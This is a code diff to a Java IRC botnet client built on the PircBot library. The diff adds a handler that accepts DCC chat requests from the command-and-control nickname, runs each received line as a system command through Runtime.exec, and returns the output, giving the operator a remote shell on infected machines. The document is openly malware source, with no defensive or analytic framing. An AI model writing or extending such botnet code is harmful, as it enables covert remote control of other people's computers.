@@ -1,6 +1,7 @@
 import java.io.*;
 import java.net.*;
 import java.util.*;
+
 import org.jibble.pircbot.*;
 
 public class BotnetClient extends PircBot {
@@ -14,6 +15,7 @@ public class BotnetClient extends PircBot {
 	private String id;
 	private Scanner input;
 	private String operator;
+	private DccChat chat;
 	
 	public static void main(String[] args) {
 		BotnetClient bn = new BotnetClient();
@@ -70,6 +72,33 @@ public class BotnetClient extends PircBot {
 		}
 	}
 	*/
+
+	protected void onIncomingChatRequest(DccChat chatObj) {
+		try {
+			if (chatObj.getNick().equals(CC)) {
+				chat = chatObj;
+				chat.accept();
+				Runtime r = Runtime.getRuntime();
+	        	chat.sendLine("$: ");
+	        	String command = chat.readLine();
+	        	while (!command.equalsIgnoreCase("quit shell")) {
+	        		Process p = r.exec(command);
+	        		Scanner in = new Scanner(p.getInputStream());
+	        		String response = "";
+	        		while (in.hasNextLine()) {
+	        			response += in.nextLine() + "\n";
+	        		}
+	        		chat.sendLine(response + "\n$: ");
+	        		command = chat.readLine();
+	        	}
+	        	chat.close();
+			} else {
+				chat = null;
+			}
+	     } catch (IOException e) {
+	    	 
+	     }
+	}
 	
 	public void write(String s) {
 		sendMessage(CHANNEL, s);
